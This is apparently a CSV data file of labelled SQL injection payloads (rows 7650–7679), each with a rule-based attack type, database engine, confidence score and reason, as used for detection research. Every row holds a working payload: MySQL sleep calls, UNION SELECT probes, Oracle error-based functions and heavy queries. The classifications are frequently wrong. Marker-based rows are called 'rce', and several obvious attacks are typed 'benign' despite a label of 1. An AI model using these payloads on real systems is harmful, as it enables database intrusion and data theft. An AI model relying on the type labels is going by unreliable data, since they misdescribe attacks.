row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7650,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'vrim' = 'vrim",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7651,"-1139 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7652,"-7345%"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
7653,"-7146"" where 6431 = 6431 or 8548 = 5549--",1,,boolean_blind,generic,0.95,6431 = 6431 or detected — boolean_blind injection (priority 8) on generic,rule-based
7654,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- rucf",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7655,-1396 where 5838 = 5838 or 9323 = 9323#,1,,boolean_blind,generic,0.95,5838 = 5838 or detected — boolean_blind injection (priority 8) on generic,rule-based
7656,"1"" ) where 5358 = 5358",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7657,1' ) where 4509 = 4509 union all select null--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7658,"1 ) as caoa where 6139 = 6139 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7659,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'bmzj' like 'bmzj",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7660,-9501' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'mndw' = 'mndw,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
7661,"1"" ) ) as ylah where 9248 = 9248",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7662,-4803%' ) ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7663,"1"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""bvdv"" like ""bvdv",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
7664,"1'+ ( select 'qaar' where 7841 = 7841 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
7665,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""mhfc"" = ""mhfc",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7666,"1'+ ( select 'nzgq' where 7230 = 7230 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7667,"-8034"" or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7668,1' ) where 5616 = 5616,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7669,select ( case when ( 5464 = 9350 ) then 5464 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7670,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7671,"-5145' where 2334 = 2334 union all select 2334,2334,2334,2334--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7672,"-2168 ) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7673,"-5245' or elt ( 1032 = 1032,3623 ) and 'qfvo' = 'qfvo",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7674,"-3581'|| ( select 'uxmh' from dual where 8954 = 8954 union all select 8954,8954,8954,8954,8954,8954#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
7675,-1385' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'mjjd' = 'mjjd,1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
7676,"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""xjdh"" = ""xjdh",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7677,1'+ ( select 'tbfj' where 4016 = 4016,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7678,"1%' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7679,"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
